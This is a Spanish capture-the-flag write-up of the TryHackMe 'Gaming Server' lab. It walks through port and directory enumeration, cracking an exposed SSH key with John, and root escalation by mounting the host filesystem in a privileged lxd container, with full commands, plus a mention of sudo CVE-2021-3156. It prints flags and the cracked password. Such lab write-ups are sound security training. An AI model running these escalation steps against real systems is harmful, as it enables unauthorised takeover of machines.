# Gaming Server

`Try Hack Me` `Linux` `SSH` `John` `lxd` `containers` `sudo privesc` `CVE-2021-3156`

## Flags

* **User Flag:** `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`
* **Root Flag:** `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`

## Users

* john _\(pwd Clave RSA SSH: `letmein`\)_

## **Enumeración**

Vemos si el host esta levantado y identificamos el SSOO con `ping -c1 IP`

> Linux: TTL &lt;= 64
>
> Windows: TTL &gt;= 65 & &lt;= 128

![](https://i.imgur.com/KXY399i.png)

### Escaneo de puertos

Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

```text
-p-         Todos los puertos 
--open      Mostrar solos puertos abiertos 
-T5         Modo más agresivo 
-v          Modo verbose (reporta por pantalla) 
-n          No aplicar resolución DNS
```

Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

```text
-sS           Realizar un TCP SYN port scan
--min-rate    Emitir al menos 5000 paquetes por segundo
-Pn           No realizar Host Discovery
```

Va más rápido y encuentra los puertos 22 \(SSH\) y 80 \(HTTP\)

![](https://i.imgur.com/Kaxg51I.png)

Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80 IP`

![](https://i.imgur.com/AXmB3U2.png)

### Servicio HTTP

Lanzamos un whatweb para ver si tiene algún CMS tipo Wordpress: `whatweb IP`

![](https://i.imgur.com/2Rjqchi.png)

Vemos que es un Apache normal. Accedemos al portal web y vemos una web de juegos.

![](https://i.imgur.com/gHi7pf1.jpg)

Vemos el código fuente de la página a ver si encontramos algo. Vemos un usuario potencial

![](https://i.imgur.com/b4c4NAJ.png)

{% hint style="warning" %}
Tenemos un usuario potencial **`john`**
{% endhint %}

Vamos a hacer un **fuzzing** en el portal para encontrar alguna ruta con **GoBuster** `gobuster dir -u IP -w DICT -q -n -e`

```text
-u        Target 
-w         Diccionario (/usr/share/wordlists/dirb/common.txt)
-q        Silencioso, no muestra mensajes de estado           
-n        No muestra códigos de estado        
-e        Muestra URLs completas
```

![](https://i.imgur.com/PJMEoha.png)

{% hint style="info" %}
Vemos un path **`IP/secret`** bastante interesante

![](https://i.imgur.com/1sjjT1D.png)
{% endhint %}

Accedemos a **`IP/secret`** y vemos un fichero **`secretKey`** con una clave privada RSA.

![](https://i.imgur.com/feTOsei.png)

### John

La clave RSA esta encriptada. Seguimos navegando y accedemos a **`IP/uploads`**.

![](https://i.imgur.com/kqXpHch.png)

Vemos lo que parece un diccionario con contraseñas.

![](https://i.imgur.com/3Nef2j6.png)

Descargamos el diccionario, le pasamos un **`sort -u`** para eliminar palabras repetidas y lo pasamos por John con los siguientes comandos.

```text
#Eliminar repetidos
cat dict.lst | sort -u > dict

#Convertir de SSH a formato John
python /usr/share/john/ssh2john.py id_rsa > hash

#Crackear la password
/usr/sbin/john --wordlist=dict hash
```

![](https://i.imgur.com/cp9gz3N.png)

{% hint style="warning" %}
Tenemos la password de **John**: **`letmein`**
{% endhint %}

## **Getting a shell**

Tenemos ya un usuario/password, por lo que conectamos por SSH:

![](https://i.imgur.com/AFlT1P4.png)

### **User Flag**

En el directorio de john vemos la **user.txt** flag.

{% hint style="success" %}
USER FLAG: **`a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`**
{% endhint %}

## **Privilege Escalation**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4):

{% embed url="https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4" caption="" %}

### Sudo and SUID files

En primer lugar, intentamos ver los privilegios de sudo del usuario john. No puede ejecutar el comando `sudo -l` sin password.

Buscamos los ficheros con el SUID activo.

`find / -user root -perm -4000 2>/dev/null`

![](https://i.imgur.com/kcybUfC.png)

Podemos buscar alguno que nos llame la atención de esta guía:

{% embed url="https://gtfobins.github.io/" caption="" %}

No encontramos ninguno interesante.

### Enumeration Script

Lanzamos este [script](https://github.com/rebootuser/LinEnum) para enumerar el sistema:

{% file src="../../.gitbook/assets/linenum.sh" caption="Linux Enumeration Script" %}

Nos copiamos el resultado del script y lo analizamos. Al final de todo vemos lo siguiente:

![](https://i.imgur.com/tYF2bQn.png)

Nos dice que formamos parte del grupo **`lxd`** y que esto se puede explotar. Buscamos información y vemos que LXD son como containers en Linux.

Usamos esta guía para explotarlo:

{% embed url="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" caption="" %}

La maquina no tiene acceso a internet asi que hacemos el método 1. Lanzamos todos estos comandos en nuestro Kali:

```text
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools

#Clone repo
sudo go get -d -v github.com/lxc/distrobuilder

#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make

#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```

Al acabar vemos que ha generado el fichero **`YAML`** de Alpine y 2 ficheros más necesarios.

![](https://i.imgur.com/Qn4jBNc.png)

Los copiamos a la máquina y lanzamos lo siguiente:

```text
#Add the image
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

#You can see your new imported image
lxc image list
```

![](https://i.imgur.com/v04drif.png)

```text
#Create a container and add root path
lxc init alpine privesc -c security.privileged=true

#List containers
lxc list
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

![](https://i.imgur.com/vwd9ScM.png)

```text
#Start container
lxc start privesc
lxc exec privesc /bin/sh
```

![](https://i.imgur.com/tL9rmMT.png)

### **Root Flag**

Hemos escalado privilegios dentro del container y en **`/mnt/root`** está cargado el directorio **`/`** del sistema. Ahi dentro, en **`/mnt/root/root/root.txt`**, tenemos la flag:

![](https://i.imgur.com/zx7uWyT.png)

{% hint style="success" %}
ROOT FLAG: **`2e337b8c9f3aff0c2b3e8d4e6a7c88fc`**
{% endhint %}

## Alternative Privilege Escalation

En el script de enumeración hemos visto que la versión de sudo es la **`1.8.21p2`**.

![](https://i.imgur.com/t9vKIlr.png)

Podemos intentar aprovechar la [vulnerabilidad](https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435) **`CVE-2021-3156`** que afecta a:

> _all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1_

Lo probamos y funciona:

![](https://i.imgur.com/kTI5cLQ.png)

